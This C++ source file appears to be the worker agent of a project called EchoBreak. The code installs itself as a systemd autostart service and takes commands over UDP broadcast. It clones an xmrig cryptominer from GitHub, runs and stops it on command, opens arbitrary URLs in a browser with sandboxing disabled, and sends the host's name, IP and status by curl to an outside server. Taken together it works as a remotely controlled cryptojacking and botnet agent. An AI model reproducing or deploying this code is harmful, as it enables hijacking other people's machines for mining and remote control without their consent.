#include <fstream>
#include <cstring>
#include <arpa/inet.h>
#include <string>
#include <unistd.h>
#include <vector>
#include <array>
#include <memory>

#define REC_PORT 6969
#define SENDING_PORT 6868
#define BUFFER_SIZE 256
#define MINER_GH std::string("https://github.com/4rch1nx/EchoBreak-xmrig.git")
#define SERVICE "/etc/systemd/system/eb.service";

#define VERSION (std::string)"2.3"

struct JsonPayload
{
    std::string name;
    std::string ip;
    std::string status;
    std::string xmrig_status;
    std::string err;
    std::string ver;
};

class Worker_utils
{
public:
    Worker_utils() { this->init(); };
    ~Worker_utils()
    {
        close(m_send_sock);
        close(m_rec_sock);
    }

    Worker_utils(const Worker_utils &) = delete;
    Worker_utils &operator=(const Worker_utils &) = delete;

public:
    inline bool isInstalled() { return std::ifstream(m_service).is_open(); };
    inline void setReceiveMsgCnt(uint cnt) { m_msg_count = cnt; };
    // Install to autostart
    void install(std::string user_name);

    // Base functions
    // Warning, that is blocking function, sets messages as a splited by (;) vector of string
    void receive(std::vector<std::string> &messages);
    void send(std::string data);
    void sendStatus();
    
    // Xmrig
    inline void instXmrig()
    {
        system(("rm -rf EchoBreak-xmrig && git clone " + MINER_GH).c_str());
        system("chmod +x EchoBreak-xmrig/conf && EchoBreak-xmrig/./conf");
    };

    inline void runXmrig() 
    { 
        system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); 
        is_xmrig_running = "runnning"; 
        std::ofstream ix("ix", std::ios::out); // is xmrig running (xmrig toggle)
        ix << "1"; ix.close();
    };

    inline void stopXmrig() 
    { 
        system("pkill xmrig"); 
        is_xmrig_running = "standby"; 
        std::ofstream ix("ix", std::ios::out); //  is xmrig running (xmrig toggle)
        ix << "0"; ix.close(); 
    };
    
    // :)
    inline void openUrl(std::string url) { system(("yandex-browser-stable --no-sandbox " + url).c_str()); }; // Replace to your browser
    
    private:
    void init();
    void err(std::string wtf);
    
    std::string createJsonStatusFile(const JsonPayload &payload); 
    void uploadToGist(const JsonPayload &payload);

private:
    const std::string m_service = SERVICE;
    std::string m_broadcast_ip;

    uint m_msg_count = 1; // Number of message to receive (is useful when ping)

    std::string is_xmrig_running = "standby";

    std::string m_ip = "128.0.0.1";

private:
    // Variables for sending data to the server
    int m_send_sock;
    struct sockaddr_in m_send_broadcast_addr;
    socklen_t m_send_addr_len = sizeof(m_send_broadcast_addr);

    // Variables for receiving data from server
    int m_rec_sock;
    struct sockaddr_in m_rec_broadcast_addr;
    char m_buffer[BUFFER_SIZE];
    socklen_t m_rec_addr_len = sizeof(m_rec_broadcast_addr);
};

/*UTILS*/

static std::vector<std::string> split(std::string str)
{
    std::string word = "";
    std::vector<std::string> res;
    for (char c : str)
    {
        if (c == ';')
        {
            res.push_back(word);
            word = "";
        }
        else
        {
            word += c;
        }
    }
    res.push_back(word);
    return res;
}

static std::string exec(const char *cmd)
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, int (*)(FILE *)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n')
    {
        result.pop_back();
    }

    return result;
}

static std::string getBroadCastAddress(){
    return exec("INTERFACE=$(ip route show default | awk \'{print $5}\') && ip -4 addr show $INTERFACE | awk \'$1 == \"inet\" {print $4}'");
}

static int run_gist_upload(const std::string &filename, std::string &out_response) {

    std::string cmd = (std::string)"curl -sS -X POST 'http://EchoBreakStatus.pythonanywhere.com/api/status' \\" +
          "-H 'Content-Type: application/json' \\" +
          "--data-binary @"+filename;

    std::array<char, 4096> buffer;
    out_response.clear();

    std::unique_ptr<FILE, int (*)(FILE *)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) return -1;

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        out_response += buffer.data();
    }

    int rc = pclose(pipe.release()); 
    if (WIFEXITED(rc)) return WEXITSTATUS(rc);
    return rc;
}
